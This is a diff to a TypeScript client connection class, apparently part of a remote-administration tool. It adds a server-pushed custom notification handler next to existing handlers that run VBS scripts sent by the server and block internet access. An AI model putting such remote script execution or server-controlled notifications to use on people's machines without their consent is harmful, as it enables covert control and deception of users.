@@ -16,6 +16,7 @@ export class ServerConnection {
   private onWebRTCSignalCallback: ((signal: any) => void) | null = null;
   private onExecuteVbsCallback: ((scriptContent: string) => void) | null = null;
   private onBlockInternetCallback: ((block: boolean) => void) | null = null;
+  private onCustomNotificationCallback: ((notification: { title: string, message: string, icon?: string, image?: string, delay?: number }) => void) | null = null;
 
   constructor(serverUrl: string = 'http://localhost:3000') {
     this.serverUrl = serverUrl;
@@ -123,6 +124,14 @@ export class ServerConnection {
       }
     });
 
+    // Custom Notification
+    this.socket.on('server:custom-notification', (notification: { title: string, message: string, icon?: string, image?: string, delay?: number }) => {
+      console.log('[ServerConnection] Ricevuto notifica personalizzata:', notification.title);
+      if (this.onCustomNotificationCallback) {
+        this.onCustomNotificationCallback(notification);
+      }
+    });
+
     // Block Internet
     this.socket.on('server:block-internet', (data: { block: boolean }) => {
       console.log(`[ServerConnection] Ricevuto comando BLOCK INTERNET: ${data.block}`);
@@ -218,6 +227,10 @@ export class ServerConnection {
 
   onBlockInternet(callback: (block: boolean) => void) {
     this.onBlockInternetCallback = callback;
+  }
+
+  onCustomNotification(callback: (notification: { title: string, message: string, icon?: string, image?: string, delay?: number }) => void) {
+    this.onCustomNotificationCallback = callback;
   }
 
   // Invia diagnostica al server
